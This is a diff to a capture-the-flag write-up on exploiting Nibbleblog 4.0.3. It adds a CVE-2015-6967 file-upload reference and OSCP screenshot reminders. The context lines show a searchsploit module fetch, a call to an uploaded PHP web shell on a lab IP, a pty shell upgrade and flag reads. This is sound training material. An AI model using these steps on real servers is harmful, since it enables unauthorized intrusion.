@@ -119,6 +119,10 @@ searchsploit -m php/remote/38489.rb
 }
 ```
 
+**CVE-2015-6967** (NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-6967)
+
+Nibbleblog 4.0.3 - My Image plugin: arbitrary file upload (no extension/MIME validation).
+
 Vulnerability: the My Image plugin preserves the original file extension and does not validate the file type - a PHP file can be uploaded.
 
 ### Obtaining Credentials
@@ -169,6 +173,9 @@ http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=wh
 # GIF8; nibbler nibbler
 ```
 
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
+
 ### Reverse Shell
 
 ```
@@ -192,6 +199,9 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```bash
 cat /home/nibbler/user.txt
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
@@ -222,6 +232,9 @@ Obtain a root shell. Read the flag:
 ```bash
 cat /root/root.txt
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
